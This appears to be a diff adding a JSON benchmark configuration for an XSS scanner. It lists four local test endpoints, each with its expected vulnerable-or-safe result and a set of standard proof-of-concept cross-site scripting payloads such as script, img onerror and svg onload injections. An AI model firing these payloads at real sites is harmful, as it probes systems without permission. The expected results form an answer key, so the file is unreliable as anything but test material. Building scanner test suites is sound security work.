@@ -1,0 +1,92 @@
+{
+  "_meta": {
+    "category": "Legacy",
+    "description": "Legacy benchmark endpoints (T1-T4) from the original test suite on port 8081",
+    "target": "http://localhost:8081"
+  },
+  "endpoints": [
+    {
+      "name": "T1",
+      "category": "Legacy",
+      "url": "http://localhost:8081/t1",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\" onfocus=alert(1) autofocus=\"", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<body onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "javascript:alert(1)", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\"><script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "'><script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "</script><script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>prompt(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>confirm(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "T2",
+      "category": "Legacy",
+      "url": "http://localhost:8081/t2",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Safe",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\" onfocus=alert(1) autofocus=\"", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<body onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "javascript:alert(1)", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\"><script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "'><script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "</script><script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>prompt(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>confirm(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "T3",
+      "category": "Legacy",
+      "url": "http://localhost:8081/t3",
+      "method": "GET",
+      "params": ["name"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\" onfocus=alert(1) autofocus=\"", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "javascript:alert(1)", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\"><script>alert(1)</script>", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "'><script>alert(1)</script>", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "T4",
+      "category": "Legacy",
+      "url": "http://localhost:8081/t4",
+      "method": "POST",
+      "params": ["txtName", "mtxMessage"],
+      "expected": "Vuln",
+      "stored_mode": true,
+      "display_url": "http://localhost:8081/t4",
+      "form_fields": {"txtName": "Alice", "mtxMessage": "HelloWorld"},
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "mtxMessage", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "mtxMessage", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\" onfocus=alert(1) autofocus=\"", "target_param": "txtName", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "mtxMessage", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<body onload=alert(1)>", "target_param": "mtxMessage", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "javascript:alert(1)", "target_param": "txtName", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\"><script>alert(1)</script>", "target_param": "mtxMessage", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "'><script>alert(1)</script>", "target_param": "mtxMessage", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    }
+  ]
+}
